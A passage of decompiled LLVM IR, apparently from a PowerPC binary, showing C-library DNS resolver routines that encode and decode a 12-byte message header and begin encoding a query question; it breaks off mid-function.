  store i1 %v1_1000f32c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000f32c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000f32c, label %dec_label_pc_1000f334, label %dec_label_pc_1000f340

dec_label_pc_1000f334:                            ; preds = %dec_label_pc_1000f328
  %v3_1000f338 = inttoptr i32 %v2_1000f338 to i8*
  store i8 58, i8* %v3_1000f338, align 1
  %v0_1000f33c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000f33c = add i32 %v0_1000f33c, 1
  store i32 %v1_1000f33c, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f340

dec_label_pc_1000f340:                            ; preds = %dec_label_pc_1000f328, %dec_label_pc_1000f320, %dec_label_pc_1000f334
  %v2_1000f354 = phi i32 [ %v2_1000f338, %dec_label_pc_1000f328 ], [ %v2_1000f26c51, %dec_label_pc_1000f320 ], [ %v1_1000f33c, %dec_label_pc_1000f334 ]
  %v1_1000f340 = sub i32 1, %v2_1000f23c
  %v2_1000f348 = add i32 %v1_1000f340, %v2_1000f354
  %v1_1000f34c = load i32, i32* @r26, align 4
  %v2_1000f34c = icmp ult i32 %v2_1000f348, %v1_1000f34c
  %v4_1000f34c = icmp eq i32 %v2_1000f348, %v1_1000f34c
  store i1 %v2_1000f34c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000f34c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000f354 = inttoptr i32 %v2_1000f354 to i8*
  store i8 0, i8* %v3_1000f354, align 1
  %v0_1000f358 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000f358 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000f358 = or i1 %v0_1000f358, %v1_1000f358
  br i1 %v2_1000f358, label %dec_label_pc_1000f370, label %dec_label_pc_1000f35c

dec_label_pc_1000f35c:                            ; preds = %dec_label_pc_1000f340
  %v0_1000f35c = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000f368 = inttoptr i32 %v0_1000f35c to i32*
  store i32 28, i32* %v2_1000f368, align 4
  %v0_1000f394.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f390

dec_label_pc_1000f370:                            ; preds = %dec_label_pc_1000f340
  %v0_1000f370 = load i32, i32* @r25, align 4
  %v2_1000f374 = bitcast i32* %stack_var_-88 to i8*
  %v3_1000f374 = call i32 @strcpy(i32 %v0_1000f370, i8* %v2_1000f374)
  br label %dec_label_pc_1000f378

dec_label_pc_1000f378:                            ; preds = %dec_label_pc_1000f134, %dec_label_pc_1000f370
  %storemerge1 = phi i32 [ %v3_1000f140, %dec_label_pc_1000f134 ], [ %v3_1000f374, %dec_label_pc_1000f370 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f390

dec_label_pc_1000f380:                            ; preds = %dec_label_pc_1000f128
  %v0_1000f380 = call i32 @__errno_location()
  %v2_1000f388 = inttoptr i32 %v0_1000f380 to i32*
  store i32 97, i32* %v2_1000f388, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f390

dec_label_pc_1000f390:                            ; preds = %dec_label_pc_1000f2c0, %dec_label_pc_1000f378, %dec_label_pc_1000f35c, %dec_label_pc_1000f380
  %v0_1000f394 = phi i32 [ 0, %dec_label_pc_1000f2c0 ], [ %storemerge1, %dec_label_pc_1000f378 ], [ %v0_1000f394.pre, %dec_label_pc_1000f35c ], [ 0, %dec_label_pc_1000f380 ]
  ret i32 %v0_1000f394

; uselistorder directives
  uselistorder i32 %v2_1000f354, { 1, 0 }
  uselistorder i32 %v2_1000f328, { 1, 0 }
  uselistorder i1 %v3_1000f248, { 0, 2, 1 }
  uselistorder i32 %v0_1000f248, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000f314, { 2, 1, 0 }
  uselistorder i32 %v0_1000f2cc66, { 1, 0 }
  uselistorder i32 %v3_1000f2d0, { 1, 0 }
  uselistorder i32 %v0_1000f29c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000f28c.pre, { 2, 0, 1 }
  uselistorder i32 %v1_1000f288, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1000f258, { 1, 0 }
  uselistorder i32 %v0_1000f278, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1000f258, { 0, 2, 1 }
  uselistorder i32 %v2_1000f284, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1000f2483, { 0, 2, 1 }
  uselistorder i32 %v0_1000f230, { 2, 1, 0 }
  uselistorder i32 %v0_1000f220.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1000f228, { 1, 0, 2 }
  uselistorder i32 %v1_1000f204, { 2, 1, 0 }
  uselistorder i32 %v1_1000f200, { 1, 0 }
  uselistorder i32 %v0_1000f1e439, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1000f1f442, { 0, 2, 1, 3 }
  uselistorder i1 %v3_1000f1b8, { 1, 0 }
  uselistorder i32 %v0_1000f200, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_1000f1b8, { 1, 0 }
  uselistorder i32 %v0_1000f1e4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1000f1f4, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1000f194, { 1, 0 }
  uselistorder i32 %v2_1000f18c, { 1, 0 }
  uselistorder i32 %v0_1000f184, { 1, 0, 2 }
  uselistorder i32 %v1_1000f16c, { 1, 0 }
  uselistorder i32 %v2_1000f148, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 16, 12, 17, 14, 13, 15, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 16, 12, 17, 14, 13, 15, 19 }
  uselistorder i32 97, { 4, 5, 8, 7, 6, 0, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i32* @r8, { 5, 9, 10, 11, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 68, 69, 70, 71, 2, 61, 65, 66, 67, 7, 8, 72, 74, 75, 42, 62, 63, 64, 73, 43, 44, 45, 46, 47, 48, 49, 3, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 0, 60, 4, 6 }
  uselistorder i32* @r7, { 10, 11, 12, 13, 0, 14, 15, 16, 17, 1, 18, 19, 6, 20, 21, 22, 23, 2, 35, 36, 37, 8, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 7, 4, 5, 33, 34, 9 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 11, 0, 12, 13, 14, 7, 8, 9, 5, 6, 10, 15 }
  uselistorder i1 true, { 3, 0, 5, 6, 1, 2, 4 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 23, 22, 3, 2, 7, 6, 15, 0, 8, 1, 14, 21, 20, 19, 18, 17, 16, 13, 12, 11, 10, 9, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000f390, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f378, { 1, 0 }
  uselistorder label %dec_label_pc_1000f340, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f314, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f2f0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000f248, { 1, 0 }
  uselistorder label %dec_label_pc_1000f23c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f220, { 1, 0 }
  uselistorder label %dec_label_pc_1000f200, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000f1fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f16c, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_1000f48c, label %dec_label_pc_1000f3b4

dec_label_pc_1000f3b4:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_1000f3b4 = add i32 %tmp, 2
  %v2_1000f3b4 = inttoptr i32 %v1_1000f3b4 to i8*
  %v3_1000f3b4 = load i8, i8* %v2_1000f3b4, align 1
  %v4_1000f3b4 = zext i8 %v3_1000f3b4 to i32
  store i32 %v4_1000f3b4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_1000f3b4, i8* %tmp3, align 1
  %v2_1000f3c0 = load i32, i32* %arg1, align 4
  store i32 %v2_1000f3c0, i32* %r0.global-to-local, align 4
  %v1_1000f3c4 = trunc i32 %v2_1000f3c0 to i8
  %v4_1000f3c4 = add i32 %arg2, 1
  %v5_1000f3c4 = inttoptr i32 %v4_1000f3c4 to i8*
  store i8 %v1_1000f3c4, i8* %v5_1000f3c4, align 1
  %v1_1000f3c8 = add i32 %tmp, 12
  %v2_1000f3c8 = inttoptr i32 %v1_1000f3c8 to i32*
  %v3_1000f3c8 = load i32, i32* %v2_1000f3c8, align 4
  store i32 %v3_1000f3c8, i32* %r0.global-to-local, align 4
  %v1_1000f3cc = add i32 %tmp, 16
  %v2_1000f3cc = inttoptr i32 %v1_1000f3cc to i32*
  %v3_1000f3cc = load i32, i32* %v2_1000f3cc, align 4
  store i32 %v3_1000f3cc, i32* %r11.global-to-local, align 4
  %v1_1000f3d0 = add i32 %tmp, 4
  %v2_1000f3d0 = inttoptr i32 %v1_1000f3d0 to i32*
  %v3_1000f3d0 = load i32, i32* %v2_1000f3d0, align 4
  %v2_1000f3d4 = icmp ne i32 %v3_1000f3c8, 0
  %v5_1000f3d8 = zext i1 %v2_1000f3d4 to i32
  store i32 %v5_1000f3d8, i32* %r10.global-to-local, align 4
  %v1_1000f3dc = add i32 %tmp, 8
  %v2_1000f3dc = inttoptr i32 %v1_1000f3dc to i32*
  %v3_1000f3dc = load i32, i32* %v2_1000f3dc, align 4
  %v2_1000f3e0 = icmp ne i32 %v3_1000f3cc, 0
  %v5_1000f3e4 = zext i1 %v2_1000f3e0 to i32
  %v1_1000f3e8 = add i32 %tmp, 20
  %v2_1000f3e8 = inttoptr i32 %v1_1000f3e8 to i32*
  %v3_1000f3e8 = load i32, i32* %v2_1000f3e8, align 4
  store i32 %v3_1000f3e8, i32* %r0.global-to-local, align 4
  %not.v2_1000f3ec = icmp eq i32 %v3_1000f3d0, 0
  %v6_1000f3f0 = sext i1 %not.v2_1000f3ec to i32
  store i32 %v5_1000f3e4, i32* %r11.global-to-local, align 4
  %v1_1000f3f8 = call i32 @__asm_rlwinm(i32 %v6_1000f3f0, i32 0, i32 24, i32 24)
  %v0_1000f3fc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000f3fc = mul i32 %v0_1000f3fc, 4
  store i32 %v1_1000f3fc, i32* %r10.global-to-local, align 4
  %v1_1000f400 = call i32 @__asm_rlwinm(i32 %v3_1000f3dc, i32 3, i32 25, i32 28)
  %v0_1000f404 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f404 = icmp ne i32 %v0_1000f404, 0
  %v5_1000f408 = zext i1 %v2_1000f404 to i32
  %v2_1000f40c = or i32 %v1_1000f3fc, %v1_1000f400
  store i32 %v2_1000f40c, i32* %r10.global-to-local, align 4
  %v1_1000f410 = add i32 %v1_1000f3f8, 128
  %v0_1000f414 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f414 = mul i32 %v0_1000f414, 2
  store i32 %v1_1000f414, i32* %r11.global-to-local, align 4
  %v2_1000f418 = or i32 %v2_1000f40c, %v5_1000f408
  store i32 %v2_1000f418, i32* %r0.global-to-local, align 4
  %v2_1000f41c = or i32 %v2_1000f418, %v1_1000f410
  %v2_1000f420 = or i32 %v2_1000f41c, %v1_1000f414
  %v1_1000f424 = trunc i32 %v2_1000f420 to i8
  %v4_1000f424 = add i32 %arg2, 2
  %v5_1000f424 = inttoptr i32 %v4_1000f424 to i8*
  store i8 %v1_1000f424, i8* %v5_1000f424, align 1
  %v1_1000f428 = add i32 %tmp, 24
  %v2_1000f428 = inttoptr i32 %v1_1000f428 to i32*
  %v3_1000f428 = load i32, i32* %v2_1000f428, align 4
  %v1_1000f42c = add i32 %tmp, 28
  %v2_1000f42c = inttoptr i32 %v1_1000f42c to i32*
  %v3_1000f42c = load i32, i32* %v2_1000f42c, align 4
  store i32 %v3_1000f42c, i32* %r0.global-to-local, align 4
  %not.v2_1000f430 = icmp eq i32 %v3_1000f428, 0
  %v6_1000f434 = sext i1 %not.v2_1000f430 to i32
  %v1_1000f438 = call i32 @__asm_rlwinm(i32 %v6_1000f434, i32 0, i32 24, i32 24)
  %v1_1000f43c = urem i32 %v3_1000f42c, 16
  store i32 %v1_1000f43c, i32* %r0.global-to-local, align 4
  %v1_1000f440 = add i32 %v1_1000f438, 128
  %v2_1000f444 = or i32 %v1_1000f43c, %v1_1000f440
  %v1_1000f448 = trunc i32 %v2_1000f444 to i8
  %v4_1000f448 = add i32 %arg2, 3
  %v5_1000f448 = inttoptr i32 %v4_1000f448 to i8*
  store i8 %v1_1000f448, i8* %v5_1000f448, align 1
  %v1_1000f44c = add i32 %tmp, 34
  %v2_1000f44c = inttoptr i32 %v1_1000f44c to i8*
  %v3_1000f44c = load i8, i8* %v2_1000f44c, align 1
  %v4_1000f44c = zext i8 %v3_1000f44c to i32
  store i32 %v4_1000f44c, i32* %r0.global-to-local, align 4
  %v4_1000f450 = add i32 %arg2, 4
  %v5_1000f450 = inttoptr i32 %v4_1000f450 to i8*
  store i8 %v3_1000f44c, i8* %v5_1000f450, align 1
  %v1_1000f454 = add i32 %tmp, 32
  %v2_1000f454 = inttoptr i32 %v1_1000f454 to i32*
  %v3_1000f454 = load i32, i32* %v2_1000f454, align 4
  store i32 %v3_1000f454, i32* %r0.global-to-local, align 4
  %v1_1000f458 = trunc i32 %v3_1000f454 to i8
  %v4_1000f458 = add i32 %arg2, 5
  %v5_1000f458 = inttoptr i32 %v4_1000f458 to i8*
  store i8 %v1_1000f458, i8* %v5_1000f458, align 1
  %v1_1000f45c = add i32 %tmp, 38
  %v2_1000f45c = inttoptr i32 %v1_1000f45c to i8*
  %v3_1000f45c = load i8, i8* %v2_1000f45c, align 1
  %v4_1000f45c = zext i8 %v3_1000f45c to i32
  store i32 %v4_1000f45c, i32* %r0.global-to-local, align 4
  %v4_1000f460 = add i32 %arg2, 6
  %v5_1000f460 = inttoptr i32 %v4_1000f460 to i8*
  store i8 %v3_1000f45c, i8* %v5_1000f460, align 1
  %v1_1000f464 = add i32 %tmp, 36
  %v2_1000f464 = inttoptr i32 %v1_1000f464 to i32*
  %v3_1000f464 = load i32, i32* %v2_1000f464, align 4
  store i32 %v3_1000f464, i32* %r0.global-to-local, align 4
  %v1_1000f468 = trunc i32 %v3_1000f464 to i8
  %v4_1000f468 = add i32 %arg2, 7
  %v5_1000f468 = inttoptr i32 %v4_1000f468 to i8*
  store i8 %v1_1000f468, i8* %v5_1000f468, align 1
  %v1_1000f46c = add i32 %tmp, 42
  %v2_1000f46c = inttoptr i32 %v1_1000f46c to i8*
  %v3_1000f46c = load i8, i8* %v2_1000f46c, align 1
  %v4_1000f46c = zext i8 %v3_1000f46c to i32
  store i32 %v4_1000f46c, i32* %r0.global-to-local, align 4
  %v4_1000f470 = add i32 %arg2, 8
  %v5_1000f470 = inttoptr i32 %v4_1000f470 to i8*
  store i8 %v3_1000f46c, i8* %v5_1000f470, align 1
  %v1_1000f474 = add i32 %tmp, 40
  %v2_1000f474 = inttoptr i32 %v1_1000f474 to i32*
  %v3_1000f474 = load i32, i32* %v2_1000f474, align 4
  store i32 %v3_1000f474, i32* %r0.global-to-local, align 4
  %v1_1000f478 = trunc i32 %v3_1000f474 to i8
  %v4_1000f478 = add i32 %arg2, 9
  %v5_1000f478 = inttoptr i32 %v4_1000f478 to i8*
  store i8 %v1_1000f478, i8* %v5_1000f478, align 1
  %v1_1000f47c = add i32 %tmp, 46
  %v2_1000f47c = inttoptr i32 %v1_1000f47c to i8*
  %v3_1000f47c = load i8, i8* %v2_1000f47c, align 1
  %v4_1000f47c = zext i8 %v3_1000f47c to i32
  store i32 %v4_1000f47c, i32* %r0.global-to-local, align 4
  %v4_1000f480 = add i32 %arg2, 10
  %v5_1000f480 = inttoptr i32 %v4_1000f480 to i8*
  store i8 %v3_1000f47c, i8* %v5_1000f480, align 1
  %v1_1000f484 = add i32 %tmp, 44
  %v2_1000f484 = inttoptr i32 %v1_1000f484 to i32*
  %v3_1000f484 = load i32, i32* %v2_1000f484, align 4
  store i32 %v3_1000f484, i32* %r0.global-to-local, align 4
  %v1_1000f488 = trunc i32 %v3_1000f484 to i8
  %v4_1000f488 = add i32 %arg2, 11
  %v5_1000f488 = inttoptr i32 %v4_1000f488 to i8*
  store i8 %v1_1000f488, i8* %v5_1000f488, align 1
  %v0_1000f48c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000f48c

dec_label_pc_1000f48c:                            ; preds = %entry, %dec_label_pc_1000f3b4
  %v0_1000f48c = phi i32 [ -1, %entry ], [ %v0_1000f48c.pre, %dec_label_pc_1000f3b4 ]
  ret i32 %v0_1000f48c

; uselistorder directives
  uselistorder i32 %v1_1000f43c, { 1, 0 }
  uselistorder i32 %v1_1000f414, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder i32 38, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000f48c, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1000f494 = load i8, i8* %arg1, align 1
  %v4_1000f494 = zext i8 %v3_1000f494 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_1000f49c = add i32 %tmp, 1
  %v3_1000f49c = inttoptr i32 %v2_1000f49c to i8*
  %v4_1000f49c = load i8, i8* %v3_1000f49c, align 1
  %v5_1000f49c = zext i8 %v4_1000f49c to i32
  %v1_1000f4a4 = mul nuw nsw i32 %v4_1000f494, 256
  %v2_1000f4a8 = or i32 %v5_1000f49c, %v1_1000f4a4
  %v2_1000f4ac = inttoptr i32 %arg2 to i32*
  store i32 %v2_1000f4a8, i32* %v2_1000f4ac, align 4
  %v0_1000f4b0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4b0 = add i32 %v0_1000f4b0, 2
  %v2_1000f4b0 = inttoptr i32 %v1_1000f4b0 to i8*
  %v3_1000f4b0 = load i8, i8* %v2_1000f4b0, align 1
  %v4_1000f4b0 = zext i8 %v3_1000f4b0 to i32
  %v1_1000f4b4 = call i32 @__asm_rlwinm(i32 %v4_1000f4b0, i32 25, i32 31, i32 31)
  %v2_1000f4b8 = add i32 %arg2, 4
  %v3_1000f4b8 = inttoptr i32 %v2_1000f4b8 to i32*
  store i32 %v1_1000f4b4, i32* %v3_1000f4b8, align 4
  %v0_1000f4bc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4bc = add i32 %v0_1000f4bc, 2
  %v2_1000f4bc = inttoptr i32 %v1_1000f4bc to i8*
  %v3_1000f4bc = load i8, i8* %v2_1000f4bc, align 1
  %v4_1000f4bc = zext i8 %v3_1000f4bc to i32
  %v1_1000f4c0 = call i32 @__asm_rlwinm(i32 %v4_1000f4bc, i32 29, i32 28, i32 31)
  %v2_1000f4c4 = add i32 %arg2, 8
  %v3_1000f4c4 = inttoptr i32 %v2_1000f4c4 to i32*
  store i32 %v1_1000f4c0, i32* %v3_1000f4c4, align 4
  %v0_1000f4c8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4c8 = add i32 %v0_1000f4c8, 2
  %v2_1000f4c8 = inttoptr i32 %v1_1000f4c8 to i8*
  %v3_1000f4c8 = load i8, i8* %v2_1000f4c8, align 1
  %v4_1000f4c8 = zext i8 %v3_1000f4c8 to i32
  %v1_1000f4cc = call i32 @__asm_rlwinm(i32 %v4_1000f4c8, i32 30, i32 31, i32 31)
  %v2_1000f4d0 = add i32 %arg2, 12
  %v3_1000f4d0 = inttoptr i32 %v2_1000f4d0 to i32*
  store i32 %v1_1000f4cc, i32* %v3_1000f4d0, align 4
  %v0_1000f4d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4d4 = add i32 %v0_1000f4d4, 2
  %v2_1000f4d4 = inttoptr i32 %v1_1000f4d4 to i8*
  %v3_1000f4d4 = load i8, i8* %v2_1000f4d4, align 1
  %v4_1000f4d4 = zext i8 %v3_1000f4d4 to i32
  %v1_1000f4d8 = call i32 @__asm_rlwinm(i32 %v4_1000f4d4, i32 31, i32 31, i32 31)
  %v2_1000f4dc = add i32 %arg2, 16
  %v3_1000f4dc = inttoptr i32 %v2_1000f4dc to i32*
  store i32 %v1_1000f4d8, i32* %v3_1000f4dc, align 4
  %v0_1000f4e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4e0 = add i32 %v0_1000f4e0, 2
  %v2_1000f4e0 = inttoptr i32 %v1_1000f4e0 to i8*
  %v3_1000f4e0 = load i8, i8* %v2_1000f4e0, align 1
  %tmp1 = urem i8 %v3_1000f4e0, 2
  %v1_1000f4e4 = zext i8 %tmp1 to i32
  %v2_1000f4e8 = add i32 %arg2, 20
  %v3_1000f4e8 = inttoptr i32 %v2_1000f4e8 to i32*
  store i32 %v1_1000f4e4, i32* %v3_1000f4e8, align 4
  %v0_1000f4ec = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4ec = add i32 %v0_1000f4ec, 3
  %v2_1000f4ec = inttoptr i32 %v1_1000f4ec to i8*
  %v3_1000f4ec = load i8, i8* %v2_1000f4ec, align 1
  %v4_1000f4ec = zext i8 %v3_1000f4ec to i32
  %v1_1000f4f0 = call i32 @__asm_rlwinm(i32 %v4_1000f4ec, i32 25, i32 31, i32 31)
  %v2_1000f4f4 = add i32 %arg2, 24
  %v3_1000f4f4 = inttoptr i32 %v2_1000f4f4 to i32*
  store i32 %v1_1000f4f0, i32* %v3_1000f4f4, align 4
  %v0_1000f4f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f4f8 = add i32 %v0_1000f4f8, 3
  %v2_1000f4f8 = inttoptr i32 %v1_1000f4f8 to i8*
  %v3_1000f4f8 = load i8, i8* %v2_1000f4f8, align 1
  %tmp2 = urem i8 %v3_1000f4f8, 16
  %v1_1000f4fc = zext i8 %tmp2 to i32
  %v2_1000f500 = add i32 %arg2, 28
  %v3_1000f500 = inttoptr i32 %v2_1000f500 to i32*
  store i32 %v1_1000f4fc, i32* %v3_1000f500, align 4
  %v0_1000f504 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f504 = add i32 %v0_1000f504, 4
  %v2_1000f504 = inttoptr i32 %v1_1000f504 to i8*
  %v3_1000f504 = load i8, i8* %v2_1000f504, align 1
  %v4_1000f504 = zext i8 %v3_1000f504 to i32
  %v1_1000f508 = add i32 %v0_1000f504, 5
  %v2_1000f508 = inttoptr i32 %v1_1000f508 to i8*
  %v3_1000f508 = load i8, i8* %v2_1000f508, align 1
  %v4_1000f508 = zext i8 %v3_1000f508 to i32
  %v1_1000f50c = mul nuw nsw i32 %v4_1000f504, 256
  %v2_1000f510 = or i32 %v4_1000f508, %v1_1000f50c
  %v2_1000f514 = add i32 %arg2, 32
  %v3_1000f514 = inttoptr i32 %v2_1000f514 to i32*
  store i32 %v2_1000f510, i32* %v3_1000f514, align 4
  %v0_1000f518 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f518 = add i32 %v0_1000f518, 6
  %v2_1000f518 = inttoptr i32 %v1_1000f518 to i8*
  %v3_1000f518 = load i8, i8* %v2_1000f518, align 1
  %v4_1000f518 = zext i8 %v3_1000f518 to i32
  %v1_1000f51c = add i32 %v0_1000f518, 7
  %v2_1000f51c = inttoptr i32 %v1_1000f51c to i8*
  %v3_1000f51c = load i8, i8* %v2_1000f51c, align 1
  %v4_1000f51c = zext i8 %v3_1000f51c to i32
  %v1_1000f520 = mul nuw nsw i32 %v4_1000f518, 256
  %v2_1000f524 = or i32 %v4_1000f51c, %v1_1000f520
  %v2_1000f528 = add i32 %arg2, 36
  %v3_1000f528 = inttoptr i32 %v2_1000f528 to i32*
  store i32 %v2_1000f524, i32* %v3_1000f528, align 4
  %v0_1000f52c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f52c = add i32 %v0_1000f52c, 8
  %v2_1000f52c = inttoptr i32 %v1_1000f52c to i8*
  %v3_1000f52c = load i8, i8* %v2_1000f52c, align 1
  %v4_1000f52c = zext i8 %v3_1000f52c to i32
  %v1_1000f530 = add i32 %v0_1000f52c, 9
  %v2_1000f530 = inttoptr i32 %v1_1000f530 to i8*
  %v3_1000f530 = load i8, i8* %v2_1000f530, align 1
  %v4_1000f530 = zext i8 %v3_1000f530 to i32
  %v1_1000f534 = mul nuw nsw i32 %v4_1000f52c, 256
  %v2_1000f538 = or i32 %v4_1000f530, %v1_1000f534
  %v2_1000f53c = add i32 %arg2, 40
  %v3_1000f53c = inttoptr i32 %v2_1000f53c to i32*
  store i32 %v2_1000f538, i32* %v3_1000f53c, align 4
  %v0_1000f540 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000f540 = add i32 %v0_1000f540, 10
  %v2_1000f540 = inttoptr i32 %v1_1000f540 to i8*
  %v3_1000f540 = load i8, i8* %v2_1000f540, align 1
  %v4_1000f540 = zext i8 %v3_1000f540 to i32
  %v1_1000f544 = add i32 %v0_1000f540, 11
  %v2_1000f544 = inttoptr i32 %v1_1000f544 to i8*
  %v3_1000f544 = load i8, i8* %v2_1000f544, align 1
  %v4_1000f544 = zext i8 %v3_1000f544 to i32
  store i32 %v4_1000f544, i32* %r9.global-to-local, align 4
  %v1_1000f548 = mul nuw nsw i32 %v4_1000f540, 256
  %v2_1000f54c = or i32 %v4_1000f544, %v1_1000f548
  %v2_1000f550 = add i32 %arg2, 44
  %v3_1000f550 = inttoptr i32 %v2_1000f550 to i32*
  store i32 %v2_1000f54c, i32* %v3_1000f550, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 7, 8, 5, 6, 12, 4, 11, 10, 0, 9, 1, 2, 3 }
  uselistorder i32 11, { 13, 14, 6, 15, 5, 3, 7, 0, 1, 8, 9, 10, 11, 12, 2, 4 }
  uselistorder i32 40, { 8, 9, 2, 11, 10, 0, 3, 4, 5, 6, 7, 1 }
  uselistorder i32 7, { 9, 10, 2, 5, 6, 7, 8, 0, 1, 3, 4, 11 }
  uselistorder i32 5, { 15, 16, 6, 7, 8, 2, 3, 9, 0, 10, 11, 1, 12, 13, 4, 14, 5 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 10, 5, 6, 7, 8, 9, 0, 1, 2, 11, 3, 4, 12, 13, 14, 15 }
  uselistorder i32 28, { 34, 35, 36, 37, 4, 5, 10, 38, 18, 47, 42, 0, 43, 44, 45, 6, 7, 19, 12, 11, 39, 40, 20, 21, 22, 23, 24, 25, 28, 26, 27, 1, 29, 48, 41, 13, 14, 15, 16, 2, 3, 17, 8, 9, 30, 31, 32, 33, 46 }
  uselistorder i32 29, { 9, 12, 13, 10, 11, 8, 2, 14, 3, 15, 0, 1, 16, 17, 4, 5, 20, 21, 18, 19, 6, 7 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_1000f574 = load i32, i32* %arg1, align 4
  store i32 %v2_1000f574, i32* %r3.global-to-local, align 4
  store i32 268498300, i32* @lr, align 4
  %v1_1000f578 = inttoptr i32 %v2_1000f574 to i8*
  %v2_1000f578 = call i32 @__encode_dotted(i8* %v1_1000f578)
  store i32 %v2_1000f578, i32* %r3.global-to-local, align 4
  %v1_1000f57c = icmp slt i32 %v2_1000f578, 0
  %v1_1000f580 = load i32, i32* @r29, align 4
  %v2_1000f580 = sub i32 %v1_1000f580, %v2_1000f578
  store i32 %v2_1000f580, i32* @r29, align 4
  br i1 %v1_1000f57c, label %dec_label_pc_1000f5c0, label %dec_label_pc_1000f58c

dec_label_pc_1000f58c:                            ; preds = %entry
  %v2_1000f584 = icmp sgt i32 %v2_1000f580, 3
